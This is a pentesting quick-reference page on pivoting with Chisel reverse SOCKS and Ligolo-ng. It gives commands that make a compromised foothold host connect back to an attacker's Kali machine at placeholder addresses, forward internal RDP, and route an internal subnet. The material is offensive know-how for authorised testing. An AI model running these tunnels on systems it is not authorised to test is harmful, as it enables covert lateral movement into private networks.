# Chisel and Ligolo-ng

[← Pivoting quick reference](../06-pivoting.md)

Use Chisel reverse SOCKS when SSH is unavailable. Use Ligolo-ng when you need a route to a subnet. Keep the proxy port, route, and target subnet in your notes so a later command has a clear path.

## Chisel reverse SOCKS

```bash
# Kali
./chisel server -p 8080 --reverse

# Foothold
./chisel client <kali-ip>:8080 R:1080:socks
```

`R:1080:socks` sets the reverse SOCKS port explicitly; `R:socks` uses the same default port. Point Proxychains at `127.0.0.1:1080` on Kali, then use TCP connect scans. See the [Chisel remote syntax](https://github.com/jpillora/chisel#usage) if your installed version behaves differently.

For one internal service instead of SOCKS, a reverse remote can expose that service on Kali:

```bash
./chisel client <kali-ip>:8080 R:3389:<internal-ip>:3389
```

Check which side owns port 3389 and confirm the internal service from the foothold first.

## Ligolo-ng

```bash
# Kali
sudo ip tuntap add user "$USER" mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert

# Foothold
./agent -connect <kali-ip>:11601 -ignore-cert
```

Select the connected agent in the Ligolo console and start its session before adding the route:

```bash
sudo ip route add <internal-subnet>/24 dev ligolo
```

To expose a listener on the proxy side back through the agent, use Ligolo's `listener_add` with the address and destination that match your session. Verify the forwarding direction with one connection before waiting for a shell.

If the route fails, check for an existing route, the agent session, and the target's reachability from the foothold. Remove the route and listener when done.
